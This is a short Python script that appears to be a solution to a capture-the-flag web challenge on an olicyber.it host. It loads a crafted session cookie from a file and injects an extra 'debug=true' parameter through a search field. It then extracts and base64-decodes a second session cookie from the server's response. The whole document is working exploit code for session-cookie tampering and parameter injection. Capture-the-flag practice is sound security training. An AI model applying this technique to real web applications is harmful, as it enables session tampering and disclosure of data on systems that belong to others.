import requests, base64

with open("output.txt", "r") as f:
    payload = f.read().strip()

URL = "http://secretarchive.challs.olicyber.it/"

s = requests.Session()
s.cookies.set("sessionID", payload)

res = s.post(URL, headers={"Content-Type":"application/x-www-form-urlencoded"}, data={"search":"spia;debug=true"})
cookie = res.headers["Set-Cookie"].split("sessionID=")[2].split(";")[0].removesuffix("%3D%3D") + "=="

plain_cookie = base64.b64decode(cookie).decode()
print(plain_cookie)
